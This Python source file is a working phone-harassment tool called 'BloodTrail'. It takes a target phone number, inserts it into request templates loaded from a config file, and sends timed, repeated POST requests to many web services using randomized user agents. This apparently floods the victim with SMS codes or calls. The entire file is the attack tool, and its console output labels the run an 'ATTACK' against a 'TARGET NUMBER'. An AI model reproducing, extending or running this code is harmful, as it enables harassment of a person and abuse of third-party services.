import re
import asyncio
import aiohttp
import json
from fake_useragent import UserAgent
from datetime import datetime

__version__ = "1.5"


def format_phone(raw_number, phone_pattern):
    digits = re.sub(r"\D", "", raw_number)
    if len(digits) < 11:
        raise ValueError(f"Wrong format.")
    formatted = phone_pattern
    for digit in digits:
        formatted = formatted.replace('X', digit, 1)
    return formatted


class Service:
    def __init__(self, service_name, url, data, phone, timeout):
        self.service_name = service_name
        self.url = url
        self.data = data
        self.phone = phone
        self.timeout = timeout
        self.next_run_time = 0
        self.runs_completed = 0
        self.ua = UserAgent()

    async def request(self):
        headers = {"User-Agent": self.ua.random}
        print(f"{' ' : >20}STARTING REQUEST: '{self.service_name}' - ATTEMPT #{self.runs_completed}")
        try:
            async with aiohttp.ClientSession() as session:
                start_time = datetime.now()
                async with session.post(self.url, json=self.data, headers=headers, timeout=10) as response:
                    result = response.status
                    duration = (datetime.now() - start_time).total_seconds()
                    print(f"{' ' : >20}SERVICE: '{self.service_name}' - STATUS: {result} - TOOK: {duration:.2f}s")
                    return result
        except aiohttp.ClientError as e:
            print(f"{' ' : >20}SERVICE: '{self.service_name}' - ERROR: Connection failed - {str(e)[:50]}")
            return None
        except asyncio.TimeoutError:
            print(f"{' ' : >20}SERVICE: '{self.service_name}' - ERROR: Request timeout")
            return None
        except Exception as e:
            print(f"{' ' : >20}SERVICE: '{self.service_name}' - ERROR: {str(e)[:50]}")
            return None

    def should_run(self, current_time):
        return current_time >= self.next_run_time

    def update_next_run_time(self, current_time):
        self.next_run_time = current_time + self.timeout
        self.runs_completed += 1
        print(
            f"{' ' : >20}SERVICE: '{self.service_name}' - NEXT RUN IN {self.timeout}s - COMPLETED RUNS: {self.runs_completed}")


class ServiceManager:
    def __init__(self):
        self.services = []
        self.start_time = None
        self.max_runs = 0
        self.running = False

    def import_services(self, service_dict, phone):
        for service_name, service_data in service_dict.items():
            try:
                formatted_phone = format_phone(phone, service_data["phone_pattern"])
                service_data_copy = service_data["data"].copy()
                for key, value in service_data_copy.items():
                    if isinstance(value, str) and "%PHONE%" in value:
                        service_data_copy[key] = value.replace("%PHONE%", formatted_phone)
                service = Service(
                    service_name=service_name,
                    url=service_data["url"],
                    data=service_data_copy,
                    phone=formatted_phone,
                    timeout=service_data["timeout"]
                )
                self.services.append(service)
                print(f"{' ' : >20}LOADED SERVICE: '{service_name}' - TIMEOUT: {service_data['timeout']}s")
            except Exception as e:
                print(f"{' ' : >20}FAILED TO LOAD SERVICE: '{service_name}' - ERROR: {str(e)[:50]}")

    async def run_service(self, service):
        await service.request()

    async def start(self, max_runs):
        if not self.services:
            print(f"{' ' : >20}NO SERVICES LOADED")
            return

        print(f"{' ' : >20}STARTING SERVICES - TOTAL: {len(self.services)} - MAX RUNS: {max_runs}")
        self.running = True
        self.start_time = 0
        self.max_runs = max_runs if max_runs is not None else float('inf')

        try:
            total_requests = 0
            start_time = datetime.now()

            while self.running:
                current_time = self.start_time

                if all(service.runs_completed >= self.max_runs for service in self.services) and self.max_runs != float(
                        'inf'):
                    print(f"{' ' : >20}ALL SERVICES COMPLETED {self.max_runs} RUNS EACH")
                    break

                tasks = []
                for service in self.services:
                    if service.should_run(current_time) and service.runs_completed < self.max_runs:
                        tasks.append(asyncio.create_task(self.run_service(service)))
                        service.update_next_run_time(current_time)
                        total_requests += 1

                if tasks:
                    await asyncio.gather(*tasks)

                self.start_time += 1
                await asyncio.sleep(1)

        except asyncio.CancelledError:
            print(f"{' ' : >20}OPERATION CANCELLED")
        except Exception as e:
            print(f"{' ' : >20}ERROR IN SERVICE MANAGER: {str(e)}")
        finally:
            elapsed = (datetime.now() - start_time).total_seconds()
            completed = sum(service.runs_completed for service in self.services)

            print(f"{' ' : >20}OPERATION COMPLETE - DURATION: {elapsed:.1f}s")
            print(f"{' ' : >20}TOTAL REQUESTS: {total_requests} - COMPLETED RUNS: {completed}")
            self.running = False

    def stop(self):
        if self.running:
            print(f"{' ' : >20}STOPPING SERVICES...")
            self.running = False


class BloodTrail:
    def __init__(self, config_path="data.json"):
        self.config_path = config_path
        self.service_manager = ServiceManager()
        self.data = None

    async def load_config(self):
        try:
            print(f"{' ' : >20}LOADING CONFIG: {self.config_path}")
            with open(self.config_path, "r", encoding="utf-8") as f:
                self.data = json.load(f)
            print(f"{' ' : >20}CONFIG LOADED: {len(self.data['services'])} services found")
            return True
        except FileNotFoundError:
            print(f"{' ' : >20}CONFIG ERROR: File {self.config_path} not found")
            return False
        except json.JSONDecodeError:
            print(f"{' ' : >20}CONFIG ERROR: Invalid JSON in {self.config_path}")
            return False
        except Exception as e:
            print(f"{' ' : >20}CONFIG ERROR: {str(e)}")
            return False

    async def start(self, phone, runs):
        print(f"{' ' : >20}INITIALIZING BLOODTRAIL FOR: {phone} - REPETITIONS: {runs}")

        if not self.data and not await self.load_config():
            print(f"{' ' : >20}FAILED TO INITIALIZE: Config not loaded")
            return False

        if not phone:
            print(f"{' ' : >20}FAILED TO INITIALIZE: No phone number provided")
            return False

        print(f"{' ' : >20}IMPORTING SERVICES FOR TARGET: {phone}")
        self.service_manager.import_services(self.data["services"], phone)

        print(f"{' ' : >20}STARTING ATTACK")
        await self.service_manager.start(runs)
        return True

    def stop(self):
        self.service_manager.stop()


async def main():
    print(f"{' ' : >20}===== BLOODTRAIL v{__version__} =====")
    bloodtrail = BloodTrail()
    if not await bloodtrail.load_config():
        return

    phone = input(f"{' ' : >20}TARGET NUMBER (+7XXXXXXXXX): ")
    runs = int(input(f"{' ' : >20}REPETITIONS per service: "))

    print(f"{' ' : >20}===== STARTING ATTACK =====")
    await bloodtrail.start(phone, runs)
    print(f"{' ' : >20}===== ATTACK COMPLETED =====")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"{' ' : >20}===== OPERATION TERMINATED =====")
